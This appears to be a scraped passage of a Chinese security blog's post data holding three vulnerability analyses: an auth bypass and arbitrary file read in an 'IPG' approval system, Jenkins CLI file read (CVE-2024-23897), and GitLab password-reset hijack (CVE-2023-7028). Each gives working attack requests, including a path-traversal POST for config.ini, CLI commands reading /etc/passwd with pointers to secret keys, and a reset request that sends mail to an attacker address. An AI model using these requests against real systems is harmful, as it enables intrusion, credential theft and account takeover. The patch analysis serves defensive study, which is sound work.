$this-&gt;load-&gt;helper(&quot;applicationFunc&quot;); $this-&gt;load-&gt;model(&quot;Application_model&quot;); $this-&gt;load-&gt;helper(&quot;common&quot;); $this-&gt;load-&gt;helper(&#x27;url&#x27;); $this-&gt;load-&gt;library(&quot;session&quot;); $language = $this-&gt;session-&gt;userdata(&#x27;language&#x27;); switch ($language) &#123; case &quot;en-us&quot;: $this-&gt;lcid = 0x0409; break; case &quot;zh-cn&quot;: $this-&gt;lcid = 0x0804; break; case &quot;zh-tw&quot;: $this-&gt;lcid = 0x0404; break; default: $language = &quot;zh-cn&quot;; $this-&gt;lcid = 0x0409; &#125; $this-&gt;language = $language; $this-&gt;logID = $this-&gt;session-&gt;userdata(&#x27;LogID&#x27;); $this-&gt;SuName = $this-&gt;session-&gt;userdata(&#x27;SuName&#x27;); $this-&gt;ManagerID = $this-&gt;session-&gt;userdata(&#x27;ManagerID&#x27;); $this-&gt;pfunc = $this-&gt;session-&gt;userdata(&#x27;apprfunc&#x27;); // 获取保存的功能类型 if(empty($this-&gt;pfunc)) $this-&gt;pfunc = &#x27;normal&#x27;;//默认选中桌面申请管理 $this-&gt;viewtype = $this-&gt;session-&gt;userdata(&#x27;viewtype&#x27;); if (empty($this-&gt;viewtype)) $this-&gt;viewtype = &#x27;pending&#x27;;//默认等待总览 $this-&gt;ufunc_rights = $this-&gt;session-&gt;userdata(&#x27;funcrights&#x27;); $this-&gt;isApp = $this-&gt;session-&gt;userdata(&#x27;isApp&#x27;); $this-&gt;config-&gt;set_item(&#x27;language&#x27;, $language); //$this-&gt;lang-&gt;load($language);//加载多语言数组 $this-&gt;lang-&gt;load($language, &#x27;appr&#x27;); $this-&gt;lang-&gt;load(&quot;console&quot;, $language); $url = $_SERVER[&#x27;REQUEST_URI&#x27;]; $arrURL = parse_url($url); $func = substr(strrchr(rtrim($arrURL[&#x27;path&#x27;], &#x27;/&#x27;), &#x27;/&#x27;), 1); $func = strtolower($func); if(!isset($this-&gt;logID) || empty($this-&gt;logID) || !isset($this-&gt;language) || empty($this-&gt;language) || !isset($this-&gt;SuName) || empty($this-&gt;SuName) ) &#123; //判断有没有device_token 的session，有就是已登录的app在发起请求 $deviceToken = $this-&gt;session-&gt;userdata(&#x27;device_token&#x27;); $appMode = $this-&gt;session-&gt;userdata(&quot;app_mode&quot;); //对于旧版本的app，这两个值是空字符串，不执行更新token if(!isNull($deviceToken) &amp;&amp; !isNull($appMode))&#123; $this-&gt;device_token = $deviceToken; $this-&gt;app_mode = $appMode; $langConfig = $this-&gt;lang-&gt;language; $update_res = rw_device_token(UPDATE_DEVICE_TOKEN, $appMode, $this-&gt;SuName, $deviceToken, $langConfig); &#125; if($func != &#x27;download&#x27;) &#123; if ($func == &#x27;getdatarecord&#x27;) &#123; $this-&gt;errorresult(ErrorCode::OERR_NOT_LOGIN); return ; &#125; redirect(&quot;appr/SignIn&quot;); return ; &#125; else &#123; session_start(); $this-&gt;logID = $_SESSION[&#x27;downloadLogID&#x27;]; $this-&gt;language = $_SESSION[&#x27;downloadLang&#x27;]; $this-&gt;SuName = $_SESSION[&#x27;downloadSuName&#x27;]; $this-&gt;ManagerID = $_SESSION[&#x27;downloadManagerID&#x27;]; if(!isset($this-&gt;logID) || empty($this-&gt;logID) || !isset($this-&gt;language) || empty($this-&gt;language) || !isset($this-&gt;SuName) || empty($this-&gt;SuName) ) &#123; redirect(&quot;appr/SignIn&quot;); &#125; &#125; &#125; else &#123; $this-&gt;load-&gt;library(&#x27;user_agent&#x27;); $this-&gt;isM = $this-&gt;agent-&gt;is_mobile(); if (!$this-&gt;isM) &#123; redirect(&quot;appr/ApplyList&quot;); &#125; &#125;&#125; 我们重点看这一段代码可以看到，如果$func == &#39;getdatarecord&#39;虽然设置了未登录的日志，但是在return之前并没有重定向到登录页，而这个func则是由uri最后一个路径决定，这里其实存在一个逻辑问题 因为我们知道php各类框架都是支持路径传入动态参数，这是主流PHP-MVC框架都支持的操作，因此访问http://ipg/appr/MApplyList/xxx/与http://ipg/appr/MApplyList/xxx/getdatarecord其实是等效的，都能走到对应的Controller以及Method，因而便能绕过对构造函数的验证 123456789101112131415161718192021222324252627282930313233343536373839404142434445$url = $_SERVER[&#x27;REQUEST_URI&#x27;];$arrURL = parse_url($url);$func = substr(strrchr(rtrim($arrURL[&#x27;path&#x27;], &#x27;/&#x27;), &#x27;/&#x27;), 1);$func = strtolower($func);if(!isset($this-&gt;logID) || empty($this-&gt;logID) || !isset($this-&gt;language) || empty($this-&gt;language) || !isset($this-&gt;SuName) || empty($this-&gt;SuName) )&#123; $deviceToken = $this-&gt;session-&gt;userdata(&#x27;device_token&#x27;); $appMode = $this-&gt;session-&gt;userdata(&quot;app_mode&quot;); if(!isNull($deviceToken) &amp;&amp; !isNull($appMode))&#123; $this-&gt;device_token = $deviceToken; $this-&gt;app_mode = $appMode; $langConfig = $this-&gt;lang-&gt;language; $update_res = rw_device_token(UPDATE_DEVICE_TOKEN, $appMode, $this-&gt;SuName, $deviceToken, $langConfig); &#125; if($func != &#x27;download&#x27;) &#123; if ($func == &#x27;getdatarecord&#x27;) &#123; $this-&gt;errorresult(ErrorCode::OERR_NOT_LOGIN); return ; &#125; redirect(&quot;appr/SignIn&quot;); return ; &#125; else &#123; session_start(); $this-&gt;logID = $_SESSION[&#x27;downloadLogID&#x27;]; $this-&gt;language = $_SESSION[&#x27;downloadLang&#x27;]; $this-&gt;SuName = $_SESSION[&#x27;downloadSuName&#x27;]; $this-&gt;ManagerID = $_SESSION[&#x27;downloadManagerID&#x27;]; if(!isset($this-&gt;logID) || empty($this-&gt;logID) || !isset($this-&gt;language) || empty($this-&gt;language) || !isset($this-&gt;SuName) || empty($this-&gt;SuName) ) &#123; redirect(&quot;appr/SignIn&quot;); &#125; &#125;&#125; 任意文件操作在mApplyList.php中和文件下载涉及downloadFile和downloadFile_client，前者涉及到session操作且文件名无法控制，而在downloadFile_client中，可以看到一切都很简单，自己看看代码即可 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337function downloadFile_client()&#123; session_write_close(); $langConfig = $this-&gt;lang-&gt;language; $path = $this-&gt;input-&gt;post_get(&#x27;path&#x27;); $fileName = $this-&gt;input-&gt;post_get(&#x27;filename&#x27;); $action = $this-&gt;input-&gt;post_get(&#x27;action&#x27;); $backparam = $this-&gt;input-&gt;post_get(&#x27;backparam&#x27;); if ($action != &quot;download&quot;) &#123; $detail = $this-&gt;input-&gt;post_get(&#x27;detail&#x27;); &#125; $guidID = $this-&gt;input-&gt;post_get(&#x27;reqID&#x27;); $type = $this-&gt;input-&gt;post_get(&#x27;type&#x27;); $srcPath = $this-&gt;input-&gt;post_get(&#x27;srcpath&#x27;); if(!isset($path) || $path == &quot;&quot; || !isset($fileName) || $fileName == &quot;&quot; || !isset($action) || $action == &quot;&quot;) &#123; $msg = $langConfig[&#x27;details_fileNotExit&#x27;]; $data[&#x27;msg&#x27;] = $msg; $data[&#x27;isM&#x27;] = $this-&gt;isM?&#x27;mobile&#x27;:&#x27;pc&#x27;; $data[&#x27;langConfig&#x27;] = $langConfig; $data[&#x27;backParam&#x27;] = $backparam; $this-&gt;load-&gt;helper(&#x27;url&#x27;); $this-&gt;load-&gt;view(&#x27;appr/ErrorView2&#x27;,$data); return; &#125; $path = &quot;tempFile/&quot;.$path; $file_dir = $path; $msg = &quot;&quot;; //取文件的名称以及类型 $fileBaseName = preg_replace(&#x27;/^.+[\\\\\\\\\\\\/]/&#x27;, &#x27;&#x27;, $fileName); // 取文件类型 $path_parts = pathinfo($fileBaseName); if (!file_exists($file_dir)) &#123; //检查文件是否存在 $msg = $langConfig[&#x27;details_fileNotExit&#x27;]; $data[&#x27;langConfig&#x27;] = $langConfig; $data[&#x27;msg&#x27;] = $msg; $data[&#x27;isM&#x27;] = $this-&gt;isM?&#x27;mobile&#x27;:&#x27;pc&#x27;; $data[&#x27;backParam&#x27;] = $backparam; $this-&gt;load-&gt;helper(&#x27;url&#x27;); $this-&gt;load-&gt;view(&#x27;appr/ErrorView2&#x27;,$data); return; &#125; else if ($action == &quot;download&quot;) &#123; $fileBaseName = getFileBaseName($fileName); $fileBaseName = rawurldecode(rawurldecode($fileBaseName)); $nSize = filesize($file_dir); $fp = fopen($file_dir, &quot;rb&quot;); // 输入文件标签 Header(&#x27;Cache-Control: must-revalidate,post-check=0,pre-check=0&#x27;); Header(&quot;Content-type: application/octet-stream&quot;); Header(&quot;Accept-Ranges: bytes&quot;); Header(&quot;Content-Length: &quot;.filesize($file_dir)); Header(&#x27;Pragma: public&#x27;); $ua = $_SERVER[&quot;HTTP_USER_AGENT&quot;]; if (preg_match(&quot;/MSIE/&quot;, $ua)) &#123; header(&#x27;Content-Disposition: attachment;filename=&quot;&#x27; . $fileBaseName . &#x27;&quot;&#x27;); &#125; elseif (preg_match(&quot;/Firefox/&quot;, $ua)) &#123; header(&#x27;Content-Disposition: attachment; filename*=&quot;utf8\\&#x27;\\&#x27;&#x27; . $fileBaseName . &#x27;&quot;&#x27;); &#125; elseif (preg_match(&quot;/Chrome/&quot;, $ua)) &#123; header(&#x27;Content-Disposition: attachment; filename=&#x27; . $fileBaseName); &#125; else &#123; header(&#x27;Content-Disposition: attachment; filename=&quot;&#x27; . $fileBaseName . &#x27;&quot;&#x27;); &#125; ob_clean(); ob_end_clean(); set_time_limit(0); $buffer = 1024; while (!feof($fp))&#123; print fread($fp, $buffer); flush(); &#125; fclose($fp); //chmod($file_dir,0777); //修改权限 //unlink($file_dir); exit; &#125; else if($action == &quot;review&quot;) &#123; $b_error = FALSE; if(filesize($file_dir) &lt;= 0) &#123; chmod($file_dir,0777); //修改权限 unlink($file_dir); $msg = $langConfig[&#x27;error_emptyFile&#x27;]; $data[&#x27;msg&#x27;] = $msg; $data[&#x27;langConfig&#x27;] = $langConfig; $data[&#x27;isM&#x27;] = $this-&gt;isM?&#x27;mobile&#x27;:&#x27;pc&#x27;; $data[&#x27;backParam&#x27;] = $backparam; $this-&gt;load-&gt;helper(&#x27;url&#x27;); $this-&gt;load-&gt;view(&#x27;appr/ErrorView2&#x27;,$data); return; &#125; // 获取水印 $cfgPath = FCPATH . &quot;config.ini&quot;; $this-&gt;load-&gt;model(&quot;Ini_model&quot;); //加载调用接口的方法 $watermaskOpen = $this-&gt;Ini_model-&gt;get_ini_string(&#x27;watermaskcfg&#x27;,&#x27;open&#x27;,&#x27;&#x27;,$cfgPath); if($watermaskOpen == &#x27;1&#x27;)&#123; $content = $this-&gt;Ini_model-&gt;get_ini_string(&#x27;watermaskcfg&#x27;,&#x27;content&#x27;,&#x27;&#x27;,$cfgPath); $cType = mb_detect_encoding($content , array(&#x27;UTF-8&#x27;,&#x27;GBK&#x27;,&#x27;LATIN1&#x27;,&#x27;BIG5&#x27;)) ; if( $cType !== &#x27;UTF-8&#x27;)&#123; $content = mb_convert_encoding($content ,&#x27;utf-8&#x27; , $cType); &#125; if($content === &#x27;&#x27;)&#123; $content = $_SERVER[&#x27;REMOTE_ADDR&#x27;].&quot; &quot;.$this-&gt;session-&gt;userdata(&#x27;SuName&#x27;).&quot; &quot;.date(&quot;Y-m-d H:i:s&quot;); &#125;else&#123; $content = str_replace(&quot;[ip]&quot;,&quot; &quot;.$_SERVER[&#x27;REMOTE_ADDR&#x27;].&quot; &quot;,$content); $content = str_replace(&quot;[user]&quot;,&quot; &quot;.$this-&gt;session-&gt;userdata(&#x27;SuName&#x27;).&quot; &quot;,$content); $content = str_replace(&quot;[time]&quot;,&quot; &quot;.date(&quot;Y-m-d H:i:s&quot;).&quot; &quot;,$content); $content= str_replace(array(&#x27;\\r\\n&#x27;,&#x27;\\r&#x27;,&#x27;\\n&#x27;),PHP_EOL,$content); // 得到的是单引号字符串，需处理换行符号 &#125; $fontsize = $this-&gt;Ini_model-&gt;get_ini_string(&#x27;watermaskcfg&#x27;,&#x27;fontsize&#x27;,&#x27;&#x27;,$cfgPath); $alpha = $this-&gt;Ini_model-&gt;get_ini_string(&#x27;watermaskcfg&#x27;,&#x27;alpha&#x27;,&#x27;&#x27;,$cfgPath); if($alpha)&#123; $alpha = min($alpha, 100); $alpha = max($alpha, 0); &#125;else&#123; $alpha = 70; &#125; $config = array( &quot;text&quot; =&gt; $content, &quot;type&quot; =&gt; 0, &quot;fontsize&quot; =&gt; $fontsize ? $fontsize.&#x27;px&#x27; : &quot;16px&quot;, &quot;alpha&quot; =&gt; 1 - $alpha / 100 ); $data[&#x27;script&#x27;] = $this-&gt;getscript(json_encode($config)); &#125; //取文件的名称以及类型 $fileBaseName = preg_replace(&#x27;/^.+[\\\\\\\\\\\\/]/&#x27;, &#x27;&#x27;, $file_dir); // 取文件类 $path_parts = pathinfo($fileBaseName); $fileBaseType = isset($path_parts[&quot;extension&quot;]) ? $path_parts[&quot;extension&quot;] : &#x27;&#x27;; $fileBaseType = strtolower($fileBaseType); $isTxt = FALSE; if($fileBaseType == &#x27;txt&#x27; || $fileBaseType == &#x27;csv&#x27;) &#123; $isTxt = TRUE; $result = $this-&gt;decryptFile(dirname(BASEPATH).&quot;/&quot;.$file_dir, $backparam); if(!$result) &#123; return; &#125; $handle = fopen($file_dir, &quot;r&quot;); $newFilename = $this-&gt;logID . microtime(true) . &quot;.txt&quot;; $newSavepath = &quot;tempFile/&quot;.$newFilename; $newHandle = fopen($newSavepath,&quot;w+&quot;,TRUE); $content = &#x27;&#x27;; // ob_clean(); // ini_set(&#x27;memory_limit&#x27;,-1); // set_time_limit(0); $buffer = 1024 * 48; // $size = filesize($file_dir); $code = FALSE; $left = &#x27;&#x27;; while (!feof($handle))&#123; $content = $left.fread($handle, $buffer); if ($code != &#x27;UTF-16LE&#x27;) &#123; //IPG-17136 web审批-预览带中文内容的txt文档乱码 $code = get_string_code($content);//$code = mb_detect_encoding($content, &quot;ASCII,GB2312,GBK,BIG-5,UTF-8,UTF-16LE&quot;); if (strlen($code) === 0) $code = &quot;UTF-16LE&quot;; &#125; if ($code != &#x27;UTF-16LE&#x27; &amp;&amp; !feof($handle)) &#123; $idx = strrpos($content, &quot;\\n&quot;); if ($idx === FALSE) $idx = strrpos($content, &#x27; &#x27;); if ($idx === FALSE) &#123; $left = &#x27;&#x27;; &#125; else &#123; $idx += 1; $left = substr($content, $idx); $content = substr($content, 0, $idx); &#125; &#125; $t = mb_convert_encoding($content, &quot;UTF-8&quot;, $code); fwrite($newHandle,$t); unset($t); // flush(); &#125; fclose($handle); fclose($newHandle); chmod($file_dir,0777); //修改权限 unlink($file_dir); // $filename = $newFilename; $file_dir = $newSavepath; $data[&#x27;langConfig&#x27;] = $langConfig; $data[&#x27;backParam&#x27;] = $backparam; $data[&#x27;url&#x27;] = base_url($file_dir); $data[&#x27;app&#x27;] = $this-&gt;isApp; $this-&gt;load-&gt;view(&#x27;appr/reviewtxt2&#x27;, $data); //IPG-16347 web控制台，桌面申请审批，限制文件类型，web控制台预览后，控制台仍显示为未预览 //解密申请 if($this-&gt;pfunc == &#x27;encrypt&#x27;)&#123; $this-&gt;setFileReadStatus($detail, $srcPath, $type, $guidID); &#125; //桌面申请 else if($this-&gt;pfunc == &#x27;normal&#x27;)&#123; $this-&gt;nf_setFileReadStatus($srcPath, $guidID); &#125; return; &#125; require_once(dirname(BASEPATH).&quot;/static/appr/lib/flexpaper/php/tool_transform.php&quot;); $image = FALSE; $html = FALSE; $dest_file = dirname(BASEPATH).&quot;/&quot;.$file_dir; $doc_type = null; $html_path = &quot;&quot;; //当使用模式5预览的时候，应该要有值 $ext = pathinfo($dest_file)[&#x27;extension&#x27;]; $ext = strtolower($ext); if ($ext != &quot;pdf&quot;) &#123; if (!$isTxt) &#123; $result = $this-&gt;decryptFile(dirname(BASEPATH).&quot;/&quot;.$file_dir, $backparam); if (!$result) &#123; return; &#125; &#125; if ($ext == &quot;html&quot; || $ext == &quot;htm&quot;) &#123; $html = TRUE; &#125; else if (!@getimagesize($dest_file)) &#123; $dest_file = dirname(BASEPATH).&quot;/&quot;.$file_dir.&quot;.pdf&quot;; // $transResult = trans_office2pdf(dirname(BASEPATH).&quot;/&quot;.$file_dir, $dest_file); //返回值修改为数组 $transResult = trans_office2pdf_2(dirname(BASEPATH).&quot;/&quot;.$file_dir, $dest_file); $dest_file = $transResult[&#x27;dest_file&#x27;]; $doc_type = $transResult[&#x27;doc_type&#x27;]; $html_path = $transResult[&#x27;html_path&#x27;]; if ($transResult[&#x27;info&#x27;] == &#x27;&#x27;) &#123; //没有执行成功，多数为没有启动openoffice chmod($file_dir, 0777); //修改权限 unlink($file_dir); $msg = $langConfig[&#x27;error_reviewFile&#x27;]; $data[&#x27;msg&#x27;] = $msg; $data[&#x27;langConfig&#x27;] = $langConfig; $data[&#x27;isM&#x27;] = $this-&gt;isM ? &#x27;mobile&#x27; : &#x27;pc&#x27;; $data[&#x27;backParam&#x27;] = $backparam; $this-&gt;load-&gt;helper(&#x27;url&#x27;); $this-&gt;load-&gt;view(&#x27;appr/ErrorView2&#x27;, $data); return; &#125; &#125; else &#123; $image = TRUE; &#125; &#125; if (!$image &amp;&amp; !$html) &#123; $result = $this-&gt;decryptFile($dest_file, $backparam); if (!$result) &#123; return; &#125; $page = getTotalPages($dest_file); $this-&gt;load-&gt;helper(&#x27;url&#x27;); $data[&#x27;langConfig&#x27;] = $langConfig; $data[&#x27;pdf_file&#x27;] = pathinfo($dest_file)[&#x27;basename&#x27;]; $data[&#x27;page_num&#x27;] = $page; $data[&#x27;backParam&#x27;] = $backparam; $data[&#x27;app&#x27;] = $this-&gt;isApp; $data[&#x27;html_file&#x27;] = $html_path; //C:Program Files (x86)/TEC/WebServer/www/ipg/tempFile/030BF...924.1872/review.html $data[&#x27;doc_type&#x27;] = $doc_type; $this-&gt;load-&gt;view(&#x27;appr/review2&#x27;, $data); &#125; else &#123; $data[&#x27;langConfig&#x27;] = $langConfig; $data[&#x27;url&#x27;] = &quot;tempFile/&quot;.pathinfo($dest_file)[&#x27;basename&#x27;]; $data[&#x27;backParam&#x27;] = $backparam; $data[&#x27;app&#x27;] = $this-&gt;isApp; if ($image) &#123; $this-&gt;load-&gt;view(&#x27;appr/reviewpic2&#x27;, $data); &#125; else &#123; $this-&gt;load-&gt;view(&#x27;appr/reviewhtml2&#x27;, $data); &#125; &#125; &#125; //IPG-16347 web控制台，桌面申请审批，限制文件类型，web控制台预览后，控制台仍显示为未预览 //解密申请 if($this-&gt;pfunc == &#x27;encrypt&#x27;)&#123; $this-&gt;setFileReadStatus($detail, $srcPath, $type, $guidID); &#125; //桌面申请 else if($this-&gt;pfunc == &#x27;normal&#x27;)&#123; $this-&gt;nf_setFileReadStatus($srcPath, $guidID); &#125;&#125; 因此最终构造如下，即可实现对任意文件的读取，另外删除文件类似不再继续赘述，这个漏洞本身也并不难没有啥高含金量 12345678910POST /ipg/appr/MApplyList/downloadFile_client/getdatarecord HTTP/1.1Host:Accept: */*Accept-Encoding: gzip, deflateConnection: closeContent-Length: 0Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36path=..%2Fconfig.ini&amp;filename=y4test&amp;action=download","categories":[{"name":"PHP","slug":"PHP","permalink":"https://y4tacker.github.io/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://y4tacker.github.io/tags/PHP/"}]},{"title":"浅析Jenkis任意文件读取(CVE-2024-23897)","slug":"year/2024/1/浅析Jenkis任意文件读取-CVE-2024-23897","date":"2024-01-27T02:07:37.000Z","updated":"2024-01-27T05:25:10.000Z","comments":true,"path":"2024/01/27/year/2024/1/浅析Jenkis任意文件读取-CVE-2024-23897/","link":"","permalink":"https://y4tacker.github.io/2024/01/27/year/2024/1/%E6%B5%85%E6%9E%90Jenkis%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-CVE-2024-23897/","excerpt":"","text":"浅析Jenkis任意文件读取(CVE-2024-23897)很久没更新博客了，还是浅浅更新一下 补丁分析首先从官方公告可以看到漏洞其实来源于CLI工具，同时可以看到用户拥有(Overall/Read)权限可以读取整个文件，而如果没有权限则仅能读取第一行 同时从commit可以看出[SECURITY-3314] · jenkinsci/jenkins@554f037 ，主要对CLICommand.java做了修改，禁止使用@符号，那么接下来我们便看看解析的时候是如何处理@符号 在org.kohsuke.args4j.CmdLineParser#parseArgument中，调用了expandAtFiles方法，从名字就能看出是处理@符号 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061public void parseArgument(String... args) throws CmdLineException &#123; Utilities.checkNonNull(args, &quot;args&quot;); String[] expandedArgs = args; if (this.parserProperties.getAtSyntax()) &#123; expandedArgs = this.expandAtFiles(args); &#125; CmdLineImpl cmdLine = new CmdLineImpl(expandedArgs); Set&lt;OptionHandler&gt; present = new HashSet(); int argIndex = 0; while(cmdLine.hasMore()) &#123; String arg = cmdLine.getCurrentToken(); if (!this.isOption(arg)) &#123; if (argIndex &gt;= this.arguments.size()) &#123; Messages msg = this.arguments.size() == 0 ? Messages.NO_ARGUMENT_ALLOWED : Messages.TOO_MANY_ARGUMENTS; throw new CmdLineException(this, msg, new String[]&#123;arg&#125;); &#125; this.currentOptionHandler = (OptionHandler)this.arguments.get(argIndex); if (this.currentOptionHandler == null) &#123; throw new IllegalStateException(&quot;@Argument with index=&quot; + argIndex + &quot; is undefined&quot;); &#125; if (!this.currentOptionHandler.option.isMultiValued()) &#123; ++argIndex; &#125; &#125; else &#123; boolean isKeyValuePair = arg.contains(this.parserProperties.getOptionValueDelimiter()) || arg.indexOf(61) != -1; this.currentOptionHandler = isKeyValuePair ? this.findOptionHandler(arg) : this.findOptionByName(arg); if (this.currentOptionHandler == null) &#123; throw new CmdLineException(this, Messages.UNDEFINED_OPTION, new String[]&#123;arg&#125;); &#125; if (isKeyValuePair) &#123; cmdLine.splitToken(); &#125; else &#123; cmdLine.proceed(1); &#125; &#125; int diff = this.currentOptionHandler.parseArguments(cmdLine); cmdLine.proceed(diff); present.add(this.currentOptionHandler); &#125; boolean helpSet = false; Iterator i$ = this.options.iterator(); while(i$.hasNext()) &#123; OptionHandler handler = (OptionHandler)i$.next(); if (handler.option.help() &amp;&amp; present.contains(handler)) &#123; helpSet = true; &#125; &#125; if (!helpSet) &#123; this.checkRequiredOptionsAndArguments(present); &#125; &#125; 在expandAtFiles中如果参数以@开头就会读取@后对应的文件，并将内容添加到数组result返回 12345678910111213141516171819202122232425private String[] expandAtFiles(String[] args) throws CmdLineException &#123; List&lt;String&gt; result = new ArrayList(); String[] arr$ = args; int len$ = args.length; for(int i$ = 0; i$ &lt; len$; ++i$) &#123; String arg = arr$[i$]; if (arg.startsWith(&quot;@&quot;)) &#123; File file = new File(arg.substring(1)); if (!file.exists()) &#123; throw new CmdLineException(this, Messages.NO_SUCH_FILE, new String[]&#123;file.getPath()&#125;); &#125; try &#123; result.addAll(readAllLines(file)); &#125; catch (IOException var9) &#123; throw new CmdLineException(this, &quot;Failed to parse &quot; + file, var9); &#125; &#125; else &#123; result.add(arg); &#125; &#125; return (String[])result.toArray(new String[result.size()]);&#125; 继续回到CLICommand,可以看到在解析前有鉴权处理，但如果命令是HelpCommand\\WhoAmICommand的实例那么就不需要权限 123456789sc = SecurityContextHolder.getContext();old = sc.getAuthentication();Authentication auth;sc.setAuthentication(auth = this.getTransportAuthentication2());if (!(this instanceof HelpCommand) &amp;&amp; !(this instanceof WhoAmICommand)) &#123; Jenkins.get().checkPermission(Jenkins.READ);&#125;p.parseArgument((String[])args.toArray(new String[0])); 因此执行 java -jar jenkins-cli.jar -s http://127.0.0.1:8080/ help @/etc/passwd或 java -jar jenkins-cli.jar -s http://127.0.0.1:8080/ who-am-i @/etc/passwd 当然其实其他指令也是可以的，有了文件读取我们其实能做的就很多了，最常见的读取/var/jenkins_home/secrets/ master.key,当然可能在其他目录下，这时候我们可以读取/proc/self/cmdline读取启动 当然后利用不是这篇文章的主题，有空网上多百度看看文章即可 参考链接https://www.openwall.com/lists/oss-security/2024/01/24/6 https://www.openwall.com/lists/oss-security/2024/01/24/6","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Jenkis","slug":"Jenkis","permalink":"https://y4tacker.github.io/tags/Jenkis/"}]},{"title":"浅析Gitlab未授权密码重置(CVE-2023-7028)","slug":"year/2024/1/浅析Gitlab未授权密码重置-CVE-2023-7028","date":"2024-01-12T11:25:03.000Z","updated":"2024-01-27T06:11:14.000Z","comments":true,"path":"2024/01/12/year/2024/1/浅析Gitlab未授权密码重置-CVE-2023-7028/","link":"","permalink":"https://y4tacker.github.io/2024/01/12/year/2024/1/%E6%B5%85%E6%9E%90Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-CVE-2023-7028/","excerpt":"","text":"浅析Gitlab未授权密码重置(CVE-2023-7028)补丁在https://gitlab.com/rluna-gitlab/gitlab-ce/-/commit/24d1060c0ae7d0ba432271da98f4fa20ab6fd671，由于问题非常简单，这里就不多说了 可以看到在原来的逻辑当中app/models/concerns/recoverable_by_any_email.rb 123456789101112131415161718192021222324252627282930313233343536module RecoverableByAnyEmail extend ActiveSupport::Concern class_methods do def send_reset_password_instructions(attributes = &#123;&#125;) email = attributes.delete(:email) super unless email recoverable = by_email_with_errors(email) recoverable.send_reset_password_instructions(to: email) if recoverable&amp;.persisted? recoverable end private def by_email_with_errors(email) record = find_by_any_email(email, confirmed: true) || new record.errors.add(:email, :invalid) unless record.persisted? record end end def send_reset_password_instructions(opts = &#123;&#125;) token = set_reset_password_token send_reset_password_instructions_notification(token, opts) token end private def send_reset_password_instructions_notification(token, opts = &#123;&#125;) send_devise_notification(:reset_password_instructions, token, opts) endend 首先获取参数email,通过by_email_with_errors方法查找用户，如果未找到用户也会向记录中添加错误，接下来我们具体看看find_by_any_email方法，如果email参数存在则继续向下执行by_any_email方法 12345def find_by_any_email(email, confirmed: false) return unless email by_any_email(email, confirmed: confirmed).takeend 在这里我们也不必要梳理具体的逻辑，从by_user_email的参数我们可以看出，它通过iwhere去查找对应的记录，同时我们可以发现从参数类型可以看到它是支持数组的！如果记录存在就会触发密码重置邮件的发送。 12345678910111213141516171819202122232425262728def by_any_email(emails, confirmed: false) from_users = by_user_email(emails) from_users = from_users.confirmed if confirmed from_emails = by_emails(emails).merge(Email.confirmed) from_emails = from_emails.confirmed if confirmed items = [from_users, from_emails] user_ids = Gitlab::PrivateCommitEmail.user_ids_for_emails(Array(emails).map(&amp;:downcase)) items &lt;&lt; where(id: user_ids) if user_ids.present? from_union(items)endxxx省略xxxscope :by_user_email, -&gt; (emails) &#123; iwhere(email: Array(emails)) &#125;scope :by_emails, -&gt; (emails) &#123; joins(:emails).where(emails: &#123; email: Array(emails).map(&amp;:downcase) &#125;) &#125;scope :for_todos, -&gt; (todos) &#123; where(id: todos.select(:user_id).distinct) &#125;scope :with_emails, -&gt; &#123; preload(:emails) &#125;scope :with_dashboard, -&gt; (dashboard) &#123; where(dashboard: dashboard) &#125;scope :with_public_profile, -&gt; &#123; where(private_profile: false) &#125;scope :with_expiring_and_not_notified_personal_access_tokens, -&gt;(at) do where(&#x27;EXISTS (?)&#x27;, ::PersonalAccessToken .where(&#x27;personal_access_tokens.user_id = users.id&#x27;) .without_impersonation .expiring_and_not_notified(at).select(1) ) 因此我们不难构造其poc 12345POST /users/password HTTP/1.1Host: 118.195.225.92:8090User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36authenticity_token=GNymVmxzUZVZrVqQS5cCtrlDwdbdGpmh4v4ojIqKc1r_yUalsQ7K5QclCQihuK88E2lJvcMGcPr5E4uJH1qtGw&amp;user[email][]=123@163.com&amp;user[email][]=47.109.68.247:1234/?a=@qq.com 简单看一下修复后的代码，虽然代码变动还是蛮大的，但是我们不难发现有一点，在查询时调用了attributes[:email].to_s，这个to_s其实就会将其转换为字符串，也避免了数组的问题，后面还有些其他的改动当然不是很重要，有兴趣自己看看 12345678910111213141516171819202122232425262728293031module RecoverableByAnyEmail extend ActiveSupport::Concern class_methods do def send_reset_password_instructions(attributes = &#123;&#125;) return super unless attributes[:email] email = Email.confirmed.find_by(email: attributes[:email].to_s) return super unless email recoverable = email.user recoverable.send_reset_password_instructions(to: email.email) recoverable end end def send_reset_password_instructions(opts = &#123;&#125;) token = set_reset_password_token send_reset_password_instructions_notification(token, opts) token end protected def send_reset_password_instructions_notification(token, opts = &#123;&#125;) send_devise_notification(:reset_password_instructions, token, opts) 